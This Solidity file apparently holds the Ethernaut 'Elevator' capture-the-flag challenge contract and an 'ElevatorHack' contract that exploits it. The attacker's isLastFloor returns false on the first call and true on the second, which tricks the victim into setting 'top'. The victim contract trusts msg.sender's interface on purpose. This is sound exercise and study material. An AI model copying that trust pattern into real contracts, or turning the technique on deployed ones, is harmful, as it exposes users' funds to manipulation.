// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract ElevatorHack {
    Elevator private victim;
    bool private hasBeenCalled = false;

    constructor(address _victim) {
        victim = Elevator(_victim);
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        if(hasBeenCalled) return true;
        hasBeenCalled = true;
        return false;
    }

    function attack() external {
        victim.goTo(1);
    }
}